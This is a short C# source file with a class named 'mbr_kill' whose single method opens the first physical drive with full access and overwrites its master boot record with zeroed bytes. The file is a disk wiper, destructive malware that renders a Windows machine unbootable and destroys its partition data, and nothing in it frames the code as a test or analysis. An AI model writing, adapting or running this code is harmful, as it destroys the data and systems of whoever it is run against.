using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace version1
{
    public class mbr_kill
    {
        public void MBR_writer()
        {
            var mbrData = new byte[Dll_Imports.MbrSize];

            var mbr = Dll_Imports.CreateFile(
                "\\\\.\\PhysicalDrive0",
                Dll_Imports.GenericAll,
                Dll_Imports.FileShareRead | Dll_Imports.FileShareWrite,
                IntPtr.Zero,
                Dll_Imports.OpenExisting,
                0,
                IntPtr.Zero);

            Dll_Imports.WriteFile(mbr, mbrData, Dll_Imports.MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}
